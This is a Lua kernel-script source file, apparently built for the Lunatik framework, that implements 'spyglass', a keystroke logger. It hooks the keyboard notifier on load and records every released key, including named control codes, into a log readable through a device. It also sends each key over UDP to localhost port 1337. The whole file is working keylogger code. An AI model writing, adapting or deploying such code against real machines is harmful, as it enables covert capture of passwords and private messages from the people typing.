--
-- Copyright (c) 2023 ring-0 Ltda.
--
-- Permission is hereby granted, free of charge, to any person obtaining
-- a copy of this software and associated documentation files (the
-- "Software"), to deal in the Software without restriction, including
-- without limitation the rights to use, copy, modify, merge, publish,
-- distribute, sublicense, and/or sell copies of the Software, and to
-- permit persons to whom the Software is furnished to do so, subject to
-- the following conditions:
--
-- The above copyright notice and this permission notice shall be
-- included in all copies or substantial portions of the Software.
--
-- THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
-- EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
-- MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
-- IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
-- CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
-- TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
-- SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
--

local notifier = require("notifier")
local device = require("device")
local inet = require("socket.inet")

local control = {
	 [0] = "nul",  [1] = "soh",  [2] = "stx",  [3] = "etx",  [4] = "eot",  [5] = "enq",
	 [6] = "ack",  [7] = "bel",  [8] = "bs",   [9] = "ht",  [10] = "nl",  [11] = "vt",
	[12] = "np",  [13] = "cr",  [14] = "so",  [15] = "si",  [16] = "dle", [17] = "dc1",
	[18] = "dc2", [19] = "dc3", [20] = "dc4", [21] = "nak", [22] = "syn", [23] = "etb",
	[24] = "can", [25] = "em",  [26] = "sub", [27] = "esc", [28] = "fs",  [29] = "gs",
	[30] = "rs",  [31] = "us", [127] = "del"
}

local function printable(keysym)
	return keysym >= 32 and keysym <= 126
end

local function nop() end

local spyglass = {name = "spyglass", open = nop, release = nop, log = ""}

function spyglass:read()
	local log = self.log
	self.log = ""
	return log
end

function spyglass:write(buf)
	local enable = tonumber(buf) ~= 0
	if enable and not self.notifier then
		self.notifier = notifier.keyboard(self.callback)
	elseif not enable and self.notifier then
		self.notifier:delete()
		self.notifier = nil
	end
end

local notify = notifier.notify
local kbd    = notifier.kbd
function spyglass.callback(event, down, shift, key)
	if not down and event == kbd.KEYSYM then
		local keysym = key & 0xFF
		local log = printable(keysym) and string.char(keysym) or
			string.format("<%s>", control[keysym])
		spyglass.log = spyglass.log .. log
		spyglass.client:send(log, inet.localhost, 1337)
	end
	return notify.OK
end

spyglass.notifier = notifier.keyboard(spyglass.callback)
spyglass.device = device.new(spyglass)
spyglass.client = inet.udp()

